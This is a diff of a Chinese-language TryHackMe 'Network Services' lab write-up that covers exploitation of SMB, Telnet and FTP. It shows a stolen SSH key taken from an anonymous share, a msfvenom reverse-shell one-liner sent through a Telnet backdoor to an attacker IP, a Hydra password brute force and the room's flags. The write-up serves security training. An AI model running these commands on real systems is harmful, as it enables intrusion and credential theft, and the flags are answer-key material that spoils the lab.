@@ -22,8 +22,6 @@ layout:
 
 TryHackMe实验房间链接：[https://tryhackme.com/room/networkservices](https://tryhackme.com/room/networkservices)
 
-
-
 ## SMB服务简介
 
 **什么是SMB？**
@@ -32,11 +30,11 @@ SMB是指服务器消息块协议（Server Message Block Protocol）--一种客�
 
 服务器使文件系统和其他资源（打印机、命名管道、API......等）可供网络上的客户端使用，虽然客户端计算机可能有自己的硬盘以便存储资源，但它们有时候确实需要访问服务器上的共享文件系统和打印机；在这个过程中我们需要用到SMB协议，SMB 协议是一种响应-请求协议，它可以在客户端和服务器之间传输多条消息以建立连接，其中的客户端将使用 TCP/IP（实际上是 RFC1001 和 RFC1002 中指定的 TCP/IP 上的 NetBIOS）、NetBEUI 或 IPX/SPX 连接到服务器。
 
-概念参考：https://www.techtarget.com/searchnetworking/definition/Server-Message-Block-Protocol
+概念参考：[https://www.techtarget.com/searchnetworking/definition/Server-Message-Block-Protocol](https://www.techtarget.com/searchnetworking/definition/Server-Message-Block-Protocol)
 
 **SMB如何工作？**
 
-![image-20230316090800445](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316090800445.png)
+<figure><img src="../../.gitbook/assets/image-20230316090800445.png" alt=""><figcaption></figcaption></figure>
 
 一旦建立连接，客户端就可以向服务器发送命令 (SMB)，以允许它们访问共享、打开文件、读取和写入文件，并且往往可以执行你想对文件系统执行的所有操作；对于 SMB，这些事情都是通过网络完成的。
 
@@ -44,9 +42,11 @@ SMB是指服务器消息块协议（Server Message Block Protocol）--一种客�
 
 自 Windows 95 以来的 Microsoft Windows 操作系统都能提供客户端和服务器的 SMB 协议支持；而在Linux系统中，常用的SMB服务器是Samba，它是一种支持 SMB 协议的开源服务器，是针对 Unix 系统发布的。
 
-**答题**
+### **答题**
 
-![image-20230316092240580](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316092240580.png)
+阅读本小节内容，并回答以下问题。
+
+<figure><img src="../../.gitbook/assets/image-20230316092240580.png" alt=""><figcaption></figcaption></figure>
 
 ## 枚举SMB信息
 
@@ -84,7 +84,9 @@ TAG            FUNCTION
 -a             all of the above (full basic enumeration) 以上所有(执行一个完整的基本SMB枚举)
 ```
 
-**答题**
+### **答题**
+
+阅读本小节内容，并回答以下问题。
 
 _注意：在本文对应的Tryhackme实验房间页面--先部署本小节对应的虚拟靶机再尝试回答相关的问题。_
 
@@ -94,7 +96,7 @@ _注意：在本文对应的Tryhackme实验房间页面--先部署本小节对�
 nmap -sC -sV -T4 10.10.92.190
 ```
 
-![image-20230315232558889](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20230315232558889.png)
+<figure><img src="../../.gitbook/assets/image-20230315232558889.png" alt=""><figcaption></figcaption></figure>
 
 > 靶机打开了3个端口；SMB服务运行在139/445端口；
 
@@ -104,15 +106,15 @@ nmap -sC -sV -T4 10.10.92.190
 enum4linux -a 10.10.92.190
 ```
 
-![image-20230315234344669](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230315234344669.png)
+<figure><img src="../../.gitbook/assets/image-20230315234344669.png" alt=""><figcaption></figcaption></figure>
 
-![image-20230315234257401](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230315234257401.png)
+<figure><img src="../../.gitbook/assets/image-20230315234257401.png" alt=""><figcaption></figcaption></figure>
 
-![image-20230315234912819](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230315234912819.png)
+<figure><img src="../../.gitbook/assets/image-20230315234912819.png" alt=""><figcaption></figcaption></figure>
 
-![image-20230315235039154](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230315235039154.png)
+<figure><img src="../../.gitbook/assets/image-20230315235039154.png" alt=""><figcaption></figcaption></figure>
 
-![image-20230316175126219](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316175126219.png)
+<figure><img src="../../.gitbook/assets/image-20230316175126219.png" alt=""><figcaption></figcaption></figure>
 
 > 工作组名称：WORKGROUP
 >
@@ -124,7 +126,7 @@ enum4linux -a 10.10.92.190
 >
 > 枚举得到的有效账户名称为：cactus
 
-![image-20230315232457245](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230315232457245.png)
+<figure><img src="../../.gitbook/assets/image-20230315232457245.png" alt=""><figcaption></figcaption></figure>
 
 ## 对SMB服务进行利用
 
@@ -139,7 +141,7 @@ enum4linux -a 10.10.92.190
 
 **SMBClient**
 
-因为我们要尝试访问 SMB 共享，所以我们需要一个SMB客户端来访问服务器上的资源，在这里我们选择使用 SMBClient，它是默认的 samba 套件的一部分；该工具在 Kali OS 和 Parrot OS上是默认可用的，在以下文档中可查找使用方法：https://www.samba.org/samba/docs/current/man-html/smbclient.1.html
+因为我们要尝试访问 SMB 共享，所以我们需要一个SMB客户端来访问服务器上的资源，在这里我们选择使用 SMBClient，它是默认的 samba 套件的一部分；该工具在 Kali OS 和 Parrot OS上是默认可用的，在以下文档中可查找使用方法：[https://www.samba.org/samba/docs/current/man-html/smbclient.1.html](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
 
 我们可以使用以下语法远程访问 SMB 共享：`smbclient //[IP]/[SHARE]`
 
@@ -148,7 +150,9 @@ enum4linux -a 10.10.92.190
 * `-U` \[name] : to specify the user 指定用户（大写英文字母U）
 * `-p` \[port] : to specify the port 指定端口
 
-**答题**
+### **答题**
+
+阅读本小节内容，并回答以下问题。
 
 _注意：在本文对应的Tryhackme实验房间页面--先部署本小节对应的虚拟靶机再尝试回答相关的问题。_
 
@@ -169,11 +173,11 @@ ls
 more "Working From Home Information.txt" 
 ```
 
-![image-20230316173637968](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316173637968.png)
+<figure><img src="../../.gitbook/assets/image-20230316173637968.png" alt=""><figcaption></figcaption></figure>
 
-![image-20230316173812801](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316173812801.png)
+<figure><img src="../../.gitbook/assets/image-20230316173812801.png" alt=""><figcaption></figcaption></figure>
 
-![image-20230316173928396](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316173928396.png)
+<figure><img src="../../.gitbook/assets/image-20230316173928396.png" alt=""><figcaption></figcaption></figure>
 
 > SMB匿名访问成功；SMB共享profiles属于 John Cactus 并且John Cactus所在的公司还为他配置了ssh服务。
 
@@ -188,7 +192,7 @@ ls
 get id_rsa
 ```
 
-![image-20230316174108778](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316174108778.png)
+<figure><img src="../../.gitbook/assets/image-20230316174108778.png" alt=""><figcaption></figcaption></figure>
 
 > 查找SMB共享中的 .ssh目录，最终发现了ssh密钥文件：id\_rsa。
 
@@ -204,15 +208,15 @@ ssh -i id_rsa  cactus@10.10.92.190
 #在id_rsa.pub公钥文件的内容末尾，可能会注明和密钥相关的ssh用户名称（这需要我们通过SMB共享找到id_rsa.pub文件）
 ```
 
-![image-20230316175708753](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316175708753.png)
+<figure><img src="../../.gitbook/assets/image-20230316175708753.png" alt=""><figcaption></figcaption></figure>
 
-![image-20230316175802542](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316175802542.png)
+<figure><img src="../../.gitbook/assets/image-20230316175802542.png" alt=""><figcaption></figcaption></figure>
 
 > 在攻击机上使用从目标机的SMB共享中获取的id\_rsa文件 进行ssh登录；最后找到的smb.txt文件的内容为：THM{smb\_is\_fun\_eh?} 。
 
-![image-20230316103635711](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316103635711.png)
+<figure><img src="../../.gitbook/assets/image-20230316103635711.png" alt=""><figcaption></figcaption></figure>
 
-_参考：chmod命令使用教程 https://www.runoob.com/linux/linux-comm-chmod.html_
+_参考：chmod命令使用教程_ [_https://www.runoob.com/linux/linux-comm-chmod.html_](https://www.runoob.com/linux/linux-comm-chmod.html)
 
 ## Telnet服务简介
 
@@ -220,7 +224,7 @@ _参考：chmod命令使用教程 https://www.runoob.com/linux/linux-comm-chmod.
 
 Telnet 是一种应用程序协议，它允许你使用 telnet 客户端连接到托管 telnet 服务器的远程计算机并在其上执行命令；当telnet 客户端与服务器成功建立连接之后，此时的telnet 客户端将成为一个虚拟终端——以允许你与远程主机进行交互。
 
-![image-20230316184605377](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316184605377.png)
+<figure><img src="../../.gitbook/assets/image-20230316184605377.png" alt=""><figcaption></figcaption></figure>
 
 **Telnet的替代品**
 
@@ -230,9 +234,11 @@ Telnet 以明文形式发送所有消息，没有特定的安全机制，因此�
 
 用户想使用 Telnet 协议连接到服务器，只需要在命令提示符环境中输入“`telnet`”命令即可，然后，用户可以在 telnet 提示符下使用特定的 telnet 命令在远程服务器上执行命令；你可以使用以下语法连接到 telnet 服务器：“`telnet [ip] [port]`”
 
-**答题**
+### **答题**
 
-![image-20230316185133384](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316185133384.png)
+阅读本小节内容，并回答以下问题。
+
+<figure><img src="../../.gitbook/assets/image-20230316185133384.png" alt=""><figcaption></figcaption></figure>
 
 ## 枚举Telnet信息
 
@@ -244,7 +250,9 @@ Telnet 以明文形式发送所有消息，没有特定的安全机制，因此�
 
 使用 nmap 扫描机器，以尽可能多地找出有关目标机器的服务、应用程序、结构和操作系统的信息。
 
-**答题**
+### **答题**
+
+阅读本小节内容，并回答以下问题。
 
 使用nmap进行端口扫描
 
@@ -255,15 +263,15 @@ nmap -A -p- -T4 10.10.186.160
 #-p- 针对目标机的全端口进行扫描
 ```
 
-![image-20230316195303077](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316195303077.png)
+<figure><img src="../../.gitbook/assets/image-20230316195303077.png" alt=""><figcaption></figcaption></figure>
 
-![image-20230316195950790](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316195950790.png)
+<figure><img src="../../.gitbook/assets/image-20230316195950790.png" alt=""><figcaption></figcaption></figure>
 
 > 目标机上打开了一个端口：8012/tcp
 >
 > 由返回的标题信息可知：该端口上可能有一个backdoor 并且涉及Skidy用户。
 
-![image-20230316190019287](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316190019287.png)
+<figure><img src="../../.gitbook/assets/image-20230316190019287.png" alt=""><figcaption></figcaption></figure>
 
 ## 对Telnet服务进行利用
 
@@ -273,9 +281,9 @@ Telnet 作为一种协议本身是不安全的，它缺乏加密处理过程，�
 
 有一些可用于攻击 Telnet 客户端和服务器系统的 CVE漏洞，我们可以检查目标机的Telnet服务是否存在已知漏洞以进行漏洞利用（以下是几个在线CVE漏洞库）：
 
-* https://www.cvedetails.com/
-* https://cve.mitre.org/
-* https://www.cve.org/
+* [https://www.cvedetails.com/](https://www.cvedetails.com/)
+* [https://cve.mitre.org/](https://cve.mitre.org/)
+* [https://www.cve.org/](https://www.cve.org/)
 
 CVE 是Common Vulnerabilities and Exposures的缩写，是公开披露的计算机安全漏洞列表；当有人提到 CVE 时，通常指的是分配给安全漏洞的 CVE ID 号。
 
@@ -301,9 +309,11 @@ CVE 是Common Vulnerabilities and Exposures的缩写，是公开披露的计算�
 
 在攻击机需要设置一个侦听端口，攻击机能够在该端口上接收来自于目标机的连接，从而针对目标机器 实现代码或命令的执行操作。
 
-![image-20230316192646084](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316192646084.png)
+<figure><img src="../../.gitbook/assets/image-20230316192646084.png" alt=""><figcaption></figcaption></figure>
 
-**答题**
+### **答题**
+
+阅读本小节内容，并回答以下问题。
 
 连接到目标 telnet 端口：
 
@@ -311,11 +321,11 @@ CVE 是Common Vulnerabilities and Exposures的缩写，是公开披露的计算�
 telnet 10.10.186.160 8012
 ```
 
-![image-20230316200529122](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316200529122.png)
+<figure><img src="../../.gitbook/assets/image-20230316200529122.png" alt=""><figcaption></figcaption></figure>
 
 > 收到的欢迎信息为：SKIDY'S BACKDOOR.
 
-![image-20230316200621964](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316200621964.png)
+<figure><img src="../../.gitbook/assets/image-20230316200621964.png" alt=""><figcaption></figcaption></figure>
 
 另开终端，在本地机器上启动一个tcpdump侦听器：
 
@@ -324,7 +334,7 @@ sudo tcpdump ip proto \\icmp -i tun0
 #选择侦听tun0网卡的流量
 ```
 
-![image-20230316201218881](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316201218881.png)
+<figure><img src="../../.gitbook/assets/image-20230316201218881.png" alt=""><figcaption></figcaption></figure>
 
 通过之前的 telnet 会话界面 使用命令“`ping [local_tun0_ip] -c 1`”来查看我们是否能够在目标机的telnet服务器上执行系统命令。
 
@@ -332,15 +342,15 @@ sudo tcpdump ip proto \\icmp -i tun0
 .RUN ping 10.11.15.168 -c 1
 ```
 
-![image-20230316202128641](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316202128641.png)
+<figure><img src="../../.gitbook/assets/image-20230316202128641.png" alt=""><figcaption></figcaption></figure>
 
 查看本地机上的tcpdump侦听器所侦听到的流量变化（以确认刚才的ping命令是否执行成功）。
 
-![image-20230316202320093](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316202320093.png)
+<figure><img src="../../.gitbook/assets/image-20230316202320093.png" alt=""><figcaption></figcaption></figure>
 
 > 我们能够在目标机的telnet服务器上执行系统命令
 
-![image-20230316202552462](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316202552462.png)
+<figure><img src="../../.gitbook/assets/image-20230316202552462.png" alt=""><figcaption></figcaption></figure>
 
 在本地攻击机上使用msfvenom 生成一个反向shell有效载荷：
 
@@ -350,10 +360,10 @@ msfvenom -p cmd/unix/reverse_netcat lhost=10.11.15.168 lport=4444 R
 #-p        有效负载类型
 #lhost     我们的本地机IP地址
 #lport     要侦听的端口（本地机上的端口）
-#R         以原始格式(Raw)导出负载
+#R         以原始格式(Raw)导出有效载荷
 ```
 
-![image-20230316204028684](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316204028684.png)
+<figure><img src="../../.gitbook/assets/image-20230316204028684.png" alt=""><figcaption></figcaption></figure>
 
 > 生成的反向shell有效载荷内容为：mkfifo /tmp/svqcho; nc 10.11.15.168 4444 0\</tmp/svqcho | /bin/sh >/tmp/svqcho 2>&1; rm /tmp/svqcho
 
@@ -363,7 +373,7 @@ msfvenom -p cmd/unix/reverse_netcat lhost=10.11.15.168 lport=4444 R
 nc -lvp 4444
 ```
 
-![image-20230316205710097](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316205710097.png)
+<figure><img src="../../.gitbook/assets/image-20230316205710097.png" alt=""><figcaption></figcaption></figure>
 
 在telnet会话中运行之前生成的反向shell有效载荷：
 
@@ -371,15 +381,15 @@ nc -lvp 4444
 .RUN mkfifo /tmp/svqcho; nc 10.11.15.168 4444 0</tmp/svqcho | /bin/sh >/tmp/svqcho 2>&1; rm /tmp/svqcho
 ```
 
-![image-20230316205924630](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316205924630.png)
+<figure><img src="../../.gitbook/assets/image-20230316205924630.png" alt=""><figcaption></figcaption></figure>
 
 我们成功在本地机上获得一个shell，使用这个shell界面查看目标机上的flag.txt文件内容：
 
-![image-20230316210025006](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316210025006.png)
+<figure><img src="../../.gitbook/assets/image-20230316210025006.png" alt=""><figcaption></figcaption></figure>
 
 > flag.txt文件的内容为：THM{y0u\_g0t\_th3\_t3ln3t\_fl4g} 。
 
-![image-20230316202824361](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316202824361.png)
+<figure><img src="../../.gitbook/assets/image-20230316202824361.png" alt=""><figcaption></figcaption></figure>
 
 ## FTP服务简介
 
@@ -398,11 +408,11 @@ nc -lvp 4444
 
 FTP使用客户端-服务器(C/S)协议运行，客户端启动与服务器的连接，服务器验证用户所提供的任何登录凭据，最后尝试打开会话；当FTP会话打开时，用户可以通过FTP客户端在FTP服务器上执行FTP命令。
 
-![image-20230316212012206](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316212012206.png)
+<figure><img src="../../.gitbook/assets/image-20230316212012206.png" alt=""><figcaption></figcaption></figure>
 
-**主动与被动**
+**FTP主动连接与被动连接**
 
-FTP服务器支持单独的主动连接 或 单独的被动连接，也可以同时支持以上两种连接方式。
+FTP服务器支持单独的主动连接或单独的被动连接，也可以同时支持以上两种连接方式。
 
 * 在主动 FTP 连接中，客户端会打开一个端口并进行监听，而服务器则需要主动连接到客户端上的端口。
 * 在被动 FTP 连接中，服务器会打开一个端口并（被动）侦听，然后客户端将连接到服务器上的端口。
@@ -411,11 +421,15 @@ tips：将命令和数据分离到单独的通道是一种无需等待当前数�
 
 **更多细节：**
 
-你可以在Internet Engineering Task Force 网站上找到有关FTP的更多详细信息：https://www.ietf.org/rfc/rfc959.txt
+我们可以在Internet Engineering Task Force网站上找到有关FTP的更多详细信息：
+
+[https://www.ietf.org/rfc/rfc959.txt](https://www.ietf.org/rfc/rfc959.txt)
 
 IETF 是众多标准机构之一，负责定义和规范互联网标准。
 
-**答题**
+### **答题**
+
+阅读本小节内容，并回答以下问题。
 
 > FTP使用的是C/S通信模型，即：client-server
 >
@@ -423,7 +437,7 @@ IETF 是众多标准机构之一，负责定义和规范互联网标准。
 >
 > FTP有两种连接方式：主动连接和被动连接
 
-![image-20230316210454953](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316210454953.png)
+<figure><img src="../../.gitbook/assets/image-20230316210454953.png" alt=""><figcaption></figcaption></figure>
 
 ## 枚举FTP信息
 
@@ -435,11 +449,13 @@ IETF 是众多标准机构之一，负责定义和规范互联网标准。
 
 一些易受攻击的 in.ftpd 版本服务器和其他一些 FTP 服务器变体对“cwd”命令会返回不同的响应，这可以被攻击者利用，我们可以在ftp身份验证之前发出一个cwd 命令，进而尝试发现有效的FTP用户帐户；此错误主要会在一些遗留系统中存在，但作为利用 FTP 的一种方式，值得我们去了解。
 
-关于此漏洞的记录 可在以下链接中找到：https://www.exploit-db.com/exploits/20745
+关于此漏洞的记录可在以下链接中找到：[https://www.exploit-db.com/exploits/20745](https://www.exploit-db.com/exploits/20745)
 
 关于此漏洞的具体描述：Solaris 所带的in.ftpd没有正确考虑ftp用户登录之前执行某些命令的情况，当用户在登录进入系统之前尝试执行某些FTP命令，in.ftpd将会返回一些错误信息，这可能会给攻击者猜测目标系统中有效用户名的机会。
 
-**答题**
+### **答题**
+
+阅读本小节内容，并回答以下问题。
 
 针对目标机器进行端口扫描：
 
@@ -447,7 +463,7 @@ IETF 是众多标准机构之一，负责定义和规范互联网标准。
 nmap -sC -sV -T4 10.10.174.84
 ```
 
-![image-20230316221616066](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316221616066.png)
+<figure><img src="../../.gitbook/assets/image-20230316221616066.png" alt=""><figcaption></figcaption></figure>
 
 > 目标机器上开放了两个端口
 >
@@ -465,13 +481,13 @@ get PUBLIC_NOTICE.txt -
 #命令末尾加“-”可查看文件内容，不加“-”则会直接下载文件到攻击机上
 ```
 
-![image-20230316220930304](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316220930304.png)
+<figure><img src="../../.gitbook/assets/image-20230316220930304.png" alt=""><figcaption></figcaption></figure>
 
 > 匿名用户的FTP目录中的文件是：PUBLIC\_NOTICE.txt
 >
 > 查看PUBLIC\_NOTICE.txt文件内容，得到的有效用户名为：mike
 
-![image-20230316221304093](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316221304093.png)
+<figure><img src="../../.gitbook/assets/image-20230316221304093.png" alt=""><figcaption></figcaption></figure>
 
 ## 对FTP服务进行利用
 
@@ -492,7 +508,7 @@ get PUBLIC_NOTICE.txt -
 
 Hydra 是一种非常快速的在线密码破解工具，可以对 50 多种协议进行快速字典攻击，包括 Telnet、RDP、SSH、FTP、HTTP、HTTPS、SMB、多种数据库等。
 
-Hydra的GitHub项目地址如下：https://github.com/vanhauser-thc/thc-hydra
+Hydra的GitHub项目地址如下：[https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)
 
 用于暴力破解ftp服务器密码的hydra命令将如下所示：
 
@@ -516,7 +532,9 @@ hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV [machine IP] ftp
 #ftp / protocol                设置要进行暴力破解的相关协议
 ```
 
-**答题**
+### **答题**
+
+阅读本小节内容，并回答以下问题。
 
 基于上一小节的枚举结果，我们已经知道了一个有效的FTP用户名(mike)；接下来我们将使用hydra工具 针对有效的ftp用户进行暴力破解--一旦破解成功，我们就能得到用户的FTP登录凭据。
 
@@ -524,7 +542,7 @@ hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV [machine IP] ftp
 hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.174.84 ftp
 ```
 
-![image-20230316221709982](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316221709982.png)
+<figure><img src="../../.gitbook/assets/image-20230316221709982.png" alt=""><figcaption></figcaption></figure>
 
 > 破解得到的mike用户的密码为：password
 
@@ -538,16 +556,16 @@ ls
 get ftp.txt -
 ```
 
-![image-20230316221948732](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316221948732.png)
+<figure><img src="../../.gitbook/assets/image-20230316221948732.png" alt=""><figcaption></figcaption></figure>
 
 > 目标文件内容为：THM{y0u\_g0t\_th3\_ftp\_fl4g} 。
 
-![image-20230316223048431](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230316223048431.png)
+<figure><img src="../../.gitbook/assets/image-20230316223048431.png" alt=""><figcaption></figcaption></figure>
 
 ## 知识扩展
 
 请阅读以下参考文章：
 
-* https://gregit.medium.com/exploiting-simple-network-services-in-ctfs-ec8735be5eef
-* https://attack.mitre.org/techniques/T1210/
-* https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/
+* [https://gregit.medium.com/exploiting-simple-network-services-in-ctfs-ec8735be5eef](https://gregit.medium.com/exploiting-simple-network-services-in-ctfs-ec8735be5eef)
+* [https://attack.mitre.org/techniques/T1210/](https://attack.mitre.org/techniques/T1210/)
+* [https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/](https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/)
